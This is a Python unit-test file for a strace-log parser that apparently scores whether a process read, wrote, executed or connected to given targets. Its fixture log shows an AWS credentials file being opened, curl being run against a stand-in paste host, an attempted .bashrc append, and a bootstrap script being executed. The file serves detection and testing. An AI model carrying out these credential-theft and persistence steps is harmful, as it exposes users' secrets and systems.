import unittest

from tests import helpers  # noqa: F401
from labscore import stracelog

S = "/home/dev/.aws/credentials"
LOG = "\n".join([
    '44    100.000001 openat(AT_FDCWD</home/dev/project>, "/home/dev/.aws/credentials", O_RDONLY|O_PATH) = 14</home/dev/.aws/credentials>',
    '45    100.100000 openat(AT_FDCWD</p>, "/home/dev/.aws/credentials", O_RDONLY) = -1 ENOENT (No such file or directory)',
    '46    100.200000 openat(AT_FDCWD</p>, "/home/dev/.aws/credentials", O_RDONLY <unfinished ...>',
    '47    100.250000 execve("/usr/bin/curl", ["curl", "-s", "http://paste.lab.test/u"], 0xaaa /* 5 vars */) = 0',
    '46    100.300000 <... openat resumed>) = 3</home/dev/.aws/credentials>',
    '48    100.400000 connect(5<TCP:[1]>, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("10.78.0.20")}, 16) = -1 ECONNREFUSED (Connection refused)',
    '49    100.500000 renameat(AT_FDCWD</p>, "/p/release.yml.tmp.1", AT_FDCWD</p>, "/p/release.yml") = 0',
    '50    100.600000 openat(AT_FDCWD</p>, "/home/dev/.bashrc", O_WRONLY|O_CREAT|O_APPEND, 0666) = -1 EROFS (Read-only file system)',
    '50    100.700000 +++ exited with 1 +++',
    '51    100.800000 execve("/bin/sh", ["sh", "scripts/bootstrap.sh"], 0xaaa /* 5 vars */) = -1 EACCES (Permission denied)',
])


class StraceTest(unittest.TestCase):
    def setUp(self):
        self.calls = list(stracelog.parse(LOG))

    def test_unfinished_and_resumed_halves_are_joined(self):
        c = [x for x in self.calls if x["pid"] == 46][0]
        self.assertEqual((c["name"], c["ret"], c["ts"]), ("openat", 3, 100.2))

    def test_exit_lines_are_not_syscalls(self):
        self.assertNotIn("+++", [c["name"] for c in self.calls])

    def test_o_path_open_is_not_an_access_and_failed_open_is_an_attempt_only(self):
        first_two = list(stracelog.parse("\n".join(LOG.split("\n")[:2])))
        hits, ok = stracelog.opens(first_two, S)
        self.assertEqual(len(hits), 1)
        self.assertIsNone(ok)

    def test_successful_open(self):
        hits, ok = stracelog.opens(self.calls, S)
        self.assertEqual((len(hits), ok["pid"]), (2, 46))

    def test_failed_write_and_rename_write(self):
        hits, ok = stracelog.writes(self.calls, "/home/dev/.bashrc")
        self.assertEqual((len(hits), ok), (1, None))
        hits, ok = stracelog.writes(self.calls, "/p/release.yml")
        self.assertEqual(ok["name"], "renameat")

    def test_exec_success_and_failure(self):
        self.assertIsNotNone(stracelog.execs(self.calls, r'"curl".*paste\.lab\.test')[1])
        hits, ok = stracelog.execs(self.calls, r"bootstrap\.sh")
        self.assertEqual((len(hits), ok), (1, None))

    def test_refused_connect_is_attempt_without_success(self):
        hits, ok = stracelog.connects(self.calls, "10.78.0.20", 80)
        self.assertEqual((len(hits), ok), (1, None))


if __name__ == "__main__":
    unittest.main()
